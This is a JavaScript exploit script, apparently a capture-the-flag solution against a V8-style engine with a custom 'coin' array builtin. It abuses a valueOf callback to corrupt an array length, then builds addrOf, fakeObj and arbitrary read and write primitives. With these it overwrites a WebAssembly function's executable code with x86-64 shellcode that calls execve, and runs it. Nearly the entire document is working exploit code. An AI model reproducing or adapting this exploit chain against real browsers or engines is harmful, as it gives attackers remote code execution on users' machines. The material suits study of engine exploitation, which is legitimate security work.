const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return i.toString(16).padStart(16, "0");
}

function wasm_func() {
    var wasmImports = {
        env: {
            puts: function puts (index) {
                print(utf8ToString(h, index));
            }
        }
    };
    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
        96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
        116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
        131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
        109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
        128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
        65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
    let h = new Uint8Array(m.exports.memory.buffer);
    return m.exports.hello;
}


func = wasm_func();


// step 1, oob write float_victim object's length to big number with coin function, using valueOf callback.
var val= {
    valueOf:function(){
        array.length = 0x100;
        return  1024;
    }
}

var array = new Array(30);
float_victim=[1.1, 2.2];
var obj = {mark:i2f(0xdeadbeef), a:func,b:func,c:func};
var data_buf = new ArrayBuffer(0x200);
var data_view = new DataView(data_buf);
array.coin(34,val);
console.log("[+] float_victim(OOBARR) array length is changed to :"+float_victim.length)

// step 2, looking for obj.a:func offset in float_victim
var float_object_idx = 0;
for(let i=0; i<0x100; i++) {
    if(f2i(float_victim[i]) == 0xdeadbeef) {
        float_object_idx = i + 1;
        console.log("float idx of object is: 0x"+hex(float_object_idx));
        break;
    }
} 

// step 3, looking for backing_stroe in data_buf
var float_array_buf_idx = 0;
for(let i=0; i<0x100; i++) {
    if(f2i(float_victim[i]) == 0x200) {
        float_array_buf_idx = i + 1;
        console.log("float idx of array buf backing store is: 0x"+hex(float_array_buf_idx));
        break;
    }
}

// step 4, build addrOf primitive 
function addrOf(obj_para)
{
    obj.a=obj_para;
    return f2i(float_victim[float_object_idx]) - 1;
}

// step 5, build fakeObj primitive
function fakeObj(fake_obj_addr)
{
    float_victim[float_object_idx] = i2f(fake_obj_addr);
    return obj.a;
}

// step 6, build aar primitive
function dataview_read64(addr)
{
    float_victim[float_array_buf_idx]=i2f(addr);
    return f2i(data_view.getFloat64(0, true));
}

// step 7, build aaw primitive
function dataview_write64(addr, value)
{
    float_victim[float_array_buf_idx] = i2f(addr);
    return data_view.setFloat64(0, f2i(value), True);
}

function dataview_write(addr, payload)
{
    float_victim[float_array_buf_idx] = i2f(addr);
    for(let i=0; i<payload.length; i++) {
        data_view.setUint8(i, payload[i]);
    }
    return ;
}

// step 8, get the JSFunction addr with addrOf primitive
var wasm_obj_addr = addrOf(func);
var wasm_store_code_addr = wasm_obj_addr - 368;
console.log("wasm code stored in addr: 0x"+hex(wasm_store_code_addr));
// step 9, get the wasm code addr with aar primitive
var wasm_code_addr = dataview_read64(wasm_store_code_addr);
console.log("wasm code addr: 0x"+hex(wasm_code_addr));

// step 10, overwrite wasm code with shellcode
var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
dataview_write(wasm_code_addr, shellcode);
// step 11, trigger wasm code and execute shellcode
func();
// %DebugPrint(float_victim);
// %DebugPrint(obj);
// %DebugPrint(func);
// %DebugPrint(data_view);
// %SystemBreak();

